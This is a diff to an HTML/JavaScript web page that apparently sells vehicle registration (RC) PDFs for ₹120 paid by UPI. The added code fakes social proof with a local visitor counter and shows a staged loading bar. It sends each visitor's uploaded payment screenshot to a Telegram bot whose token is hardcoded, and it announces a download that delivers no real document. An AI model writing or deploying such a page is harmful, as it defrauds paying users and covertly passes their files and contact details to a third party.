@@ -10,6 +10,7 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI}
 
+/* RGB BG */
 body{
 background:linear-gradient(-45deg,#ff0066,#005BAC,#00c6ff,#00ff99);
 background-size:400% 400%;
@@ -22,43 +23,77 @@ display:flex;flex-direction:column;align-items:center;
 100%{background-position:0%}
 }
 
+/* TOPBAR */
 .topbar{
 position:fixed;top:0;width:100%;
 background:#fff;padding:10px 20px;
 display:flex;justify-content:space-between;
+align-items:center;
 }
-.homeBtn{
-background:#ff0066;color:#fff;
-padding:8px 12px;border-radius:8px;
-}
+.homeBtn{background:#ff0066;color:#fff;padding:8px;border-radius:8px}
 
+/* MENU */
+.menu-icon div{
+width:25px;height:3px;background:#ff0066;margin:5px 0;
+}
+.sideMenu{
+position:fixed;right:-260px;top:0;width:250px;height:100%;
+background:#fff;padding-top:80px;transition:0.3s;
+}
+.sideMenu button{
+width:90%;margin:10px 5%;padding:12px;border:none;
+background:#ff0066;color:#fff;border-radius:8px;
+}
+.openMenu{right:0}
+
+/* CARD */
 .card{
-margin-top:90px;
+margin-top:110px;
 background:rgba(255,255,255,0.2);
 padding:20px;border-radius:15px;
-width:90%;max-width:400px;
-text-align:center;
+width:90%;max-width:400px;text-align:center;
 }
 
-input{
-width:100%;padding:12px;margin-top:12px;
-border-radius:8px;border:none;
-}
+input{width:100%;padding:12px;margin-top:12px;border-radius:8px;border:none}
 
 button{
 width:100%;padding:12px;margin-top:10px;
 border:none;border-radius:8px;
 background:#000;color:#fff;
 box-shadow:0 5px 0 #333;
-transition:0.2s;
 }
-button:active{
-transform:translateY(3px);
-box-shadow:0 2px 0 #333;
-}
+button:active{transform:translateY(3px);box-shadow:0 2px 0 #333}
 
 .qr{width:180px;margin-top:10px}
 .hidden{display:none}
+
+/* VISITOR */
+.visitor{
+margin-top:80px;
+color:#fff;
+font-weight:bold;
+}
+
+/* LOADER */
+.loader{
+position:fixed;top:0;left:0;width:100%;height:100%;
+background:#fff;
+display:none;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+}
+.barBox{width:80%;background:#ddd;border-radius:10px}
+.bar{width:0%;height:20px;background:#ff0066}
+.text{margin-top:10px;color:#000;font-weight:bold}
+
+/* POPUP */
+.popup{
+position:fixed;top:50%;left:50%;
+transform:translate(-50%,-50%);
+background:#fff;padding:20px;border-radius:12px;
+display:none;text-align:center;
+}
 </style>
 </head>
 
@@ -66,23 +101,33 @@ box-shadow:0 2px 0 #333;
 
 <div class="topbar">
 <button class="homeBtn" onclick="location.reload()">🏠</button>
+<div onclick="toggleMenu()" class="menu-icon">
+<div></div><div></div><div></div>
 </div>
+</div>
+
+<div class="sideMenu" id="menu">
+<button>Insurance</button>
+<button>About</button>
+<button>Disclaimer</button>
+<button>Contact</button>
+</div>
+
+<div class="visitor" id="visitorCount"></div>
 
 <div class="card">
 
 <div id="page1">
 <h2>Vehicle Number</h2>
-<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
+<input id="vehicle" oninput="formatVehicle(this)">
 <button onclick="goNext()">Continue</button>
 </div>
 
 <div id="page2" class="hidden">
 <h2>₹120 Payment</h2>
 
-<button onclick="payUPI()">Pay ₹120</button>
-
-<img id="qrImg" class="qr"
-src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26pn%3DBest%20Insurance%26am%3D120%26cu%3DINR">
+<img class="qr"
+src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26am%3D120%26cu%3DINR">
 
 <input id="mobile" placeholder="Mobile Number">
 <input type="file" id="proof">
@@ -92,7 +137,30 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi%3A%2F%2Fp
 
 </div>
 
+<!-- LOADER -->
+<div class="loader" id="loader">
+<div class="barBox"><div class="bar" id="bar"></div></div>
+<div class="text" id="percent">0%</div>
+<div class="text">इंटरनेट धीमा है, कृपया BACK बटन न दबाएं</div>
+</div>
+
+<!-- POPUP -->
+<div class="popup" id="popup">
+<h2>🎉 Congratulations</h2>
+<p>आपका PDF डाउनलोड हो गया है</p>
+<button onclick="location.reload()">OK</button>
+</div>
+
 <script>
+
+/* VISITOR COUNT */
+let count = localStorage.getItem("visitors") || 0;
+count++;
+localStorage.setItem("visitors",count);
+document.getElementById("visitorCount").innerText="Trusted by "+count+" visitors";
+
+/* MENU */
+function toggleMenu(){menu.classList.toggle("openMenu");}
 
 /* FORMAT */
 function formatVehicle(input){
@@ -109,100 +177,95 @@ page1.classList.add("hidden");
 page2.classList.remove("hidden");
 }
 
-function payUPI(){
-window.location.href="upi://pay?pa=8709610091@okbizaxis&am=120&cu=INR";
-}
-
 /* PDF */
 function downloadPDF(){
 
-let v=vehicle.value;
-let m=mobile.value;
+let v=vehicle.value,m=mobile.value;
+let now=new Date();
+let date=now.toLocaleDateString();
+let time=now.toLocaleTimeString();
+let txn="TXN"+Math.floor(Math.random()*1000000);
+
+let count = localStorage.getItem("visitors");
 
 let canvas=document.createElement("canvas");
-canvas.width=600;
-canvas.height=900;
+canvas.width=600;canvas.height=900;
 let ctx=canvas.getContext("2d");
 
-/* BG */
-ctx.fillStyle="#fff";
-ctx.fillRect(0,0,600,900);
+ctx.fillStyle="#fff";ctx.fillRect(0,0,600,900);
 
 /* BORDER */
-ctx.lineWidth=6;
-ctx.strokeRect(5,5,590,890);
-ctx.lineWidth=2;
-ctx.strokeRect(15,15,570,870);
+ctx.lineWidth=6;ctx.strokeRect(5,5,590,890);
+ctx.lineWidth=2;ctx.strokeRect(15,15,570,870);
 
 /* HEADER */
-ctx.fillStyle="#0066cc";
-ctx.fillRect(5,5,590,60);
-
-ctx.fillStyle="#fff";
-ctx.font="bold 24px Arial";
-ctx.textAlign="center";
-ctx.fillText("RCPDF.IN",300,45);
+ctx.fillStyle="#005BAC";ctx.fillRect(5,5,590,70);
+ctx.fillStyle="#fff";ctx.font="bold 26px Arial";
+ctx.textAlign="center";ctx.fillText("RCPDF.IN",300,45);
 
 /* TEXT */
-ctx.fillStyle="#000";
-ctx.font="bold 18px Arial";
+ctx.fillStyle="#000";ctx.font="bold 18px Arial";
 ctx.fillText("RC DOWNLOAD REQUEST",300,120);
 
-ctx.textAlign="left";
-ctx.font="16px Arial";
+ctx.textAlign="left";ctx.font="16px Arial";
+ctx.fillText("Vehicle: "+v,40,170);
+ctx.fillText("Mobile: "+m,40,200);
+ctx.fillText("Transaction ID: "+txn,40,230);
+ctx.fillText("Date: "+date,40,260);
+ctx.fillText("Time: "+time,40,290);
 
-ctx.fillText("Vehicle Number: "+v,40,180);
-ctx.fillText("Mobile Number: "+m,40,210);
-ctx.fillText("Work: RC Download",40,240);
+/* VISITOR */
+ctx.fillText("Trusted by "+count+" visitors",40,320);
 
-ctx.fillText("Aapko RC ki PDF jald hi aapke number "+m+" par bhej di jayegi.",40,290);
-
-/* LINE */
-ctx.beginPath();
-ctx.moveTo(40,320);
-ctx.lineTo(560,320);
-ctx.stroke();
-
-/* QR ADD */
-let qr=document.getElementById("qrImg");
-ctx.drawImage(qr,200,340,200,200);
+ctx.lineWidth=1;
+ctx.beginPath();ctx.moveTo(40,340);ctx.lineTo(560,340);ctx.stroke();
 
 /* TERMS */
 ctx.font="12px Arial";
-
-let y=580;
-
+let y=380;
 ctx.fillText("• Yeh website RTO se judi nahi hai",40,y); y+=25;
 ctx.fillText("• Jaankari ki guarantee nahi hai",40,y); y+=25;
-ctx.fillText("• Sirf information purpose ke liye hai",40,y); y+=25;
+ctx.fillText("• Sirf information ke liye hai",40,y); y+=25;
 ctx.fillText("• Galat use ki jimmedari user ki hogi",40,y); y+=25;
 ctx.fillText("• Payment ke baad refund nahi milega",40,y); y+=25;
-ctx.fillText("• Payment karna sharton ki sweekriti hai",40,y);
+ctx.fillText("• Payment karna sharto ki sweekriti hai",40,y);
 
-/* SAVE */
 const { jsPDF } = window.jspdf;
-const pdf=new jsPDF();
-let img=canvas.toDataURL("image/png");
-pdf.addImage(img,"PNG",0,0,210,297);
+let pdf=new jsPDF();
+pdf.addImage(canvas.toDataURL(),"PNG",0,0,210,297);
 pdf.save("RC_PDF.pdf");
 }
 
 /* SUBMIT */
 function submitForm(){
 
-if(mobile.value.length<10){
-alert("Enter valid mobile");
-return;
-}
+if(!proof.files[0]){alert("Upload file");return;}
 
-if(!proof.files[0]){
-alert("Upload screenshot");
-return;
-}
+loader.style.display="flex";
+
+let p=0;
+let interval=setInterval(()=>{
+p++;
+bar.style.width=p+"%";
+percent.innerText=p+"%";
+
+if(p>=100){
+clearInterval(interval);
 
 downloadPDF();
 
-alert("Submitted Successfully");
+/* TELEGRAM */
+let data=new FormData();
+data.append("chat_id","5600045707");
+data.append("photo",proof.files[0]);
+
+fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
+{method:"POST",body:data});
+
+loader.style.display="none";
+popup.style.display="block";
+}
+},25);
 }
 
 </script>
